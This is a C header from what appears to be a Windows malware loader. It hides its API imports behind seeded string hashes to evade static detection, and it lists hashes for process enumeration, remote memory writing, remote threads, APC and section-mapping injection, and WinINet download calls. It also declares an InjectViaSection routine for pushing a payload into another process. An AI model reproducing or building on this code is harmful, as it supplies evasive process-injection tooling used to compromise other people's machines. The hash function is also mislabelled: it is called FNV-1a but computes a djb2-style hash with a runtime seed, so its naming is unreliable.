#ifndef RUNTIME_APIHASH_H
#define RUNTIME_APIHASH_H

#include <Windows.h>
#include <stdio.h>

inline DWORD GetUniqueSeed() {
    static DWORD seed = (DWORD)__rdtsc() ^ GetTickCount();
    return seed;
}

inline DWORD HashStringFnv1a(const char* String) {
    DWORD Hash = GetUniqueSeed() % 0xFFFFFF;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << 5) + Hash) + c;
    }
    ////printf("[DEBUG] Hash for API '%s': 0x%08X\n", String, Hash); // Debug
    return Hash;
}

#define CTIME_HASHA(API) static DWORD API##_Hash = HashStringFnv1a((const char*) #API);

// API hashing
CTIME_HASHA(LoadLibraryA);
CTIME_HASHA(GetProcAddress);
CTIME_HASHA(VirtualAllocEx);
CTIME_HASHA(WriteProcessMemory);
CTIME_HASHA(VirtualProtectEx);
CTIME_HASHA(CreateRemoteThread);
CTIME_HASHA(OpenProcess);
CTIME_HASHA(CreateToolhelp32Snapshot);
CTIME_HASHA(Process32First);
CTIME_HASHA(Process32Next);
CTIME_HASHA(InternetOpenW);
CTIME_HASHA(InternetOpenUrlW);
CTIME_HASHA(InternetReadFile);
CTIME_HASHA(InternetCloseHandle);
CTIME_HASHA(CloseHandle);
CTIME_HASHA(LocalAlloc);
CTIME_HASHA(LocalReAlloc);
CTIME_HASHA(LocalFree);
CTIME_HASHA(GetLastError);
CTIME_HASHA(QueueUserAPC);
CTIME_HASHA(OpenThread);
CTIME_HASHA(Thread32First);
CTIME_HASHA(Thread32Next);
CTIME_HASHA(NtCreateSection);
CTIME_HASHA(NtMapViewOfSection);
CTIME_HASHA(NtUnmapViewOfSection);
CTIME_HASHA(NtCreateThreadEx);

BOOL InjectViaSection(HANDLE hProcess, PBYTE payload, SIZE_T payloadSize);

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);

#endif
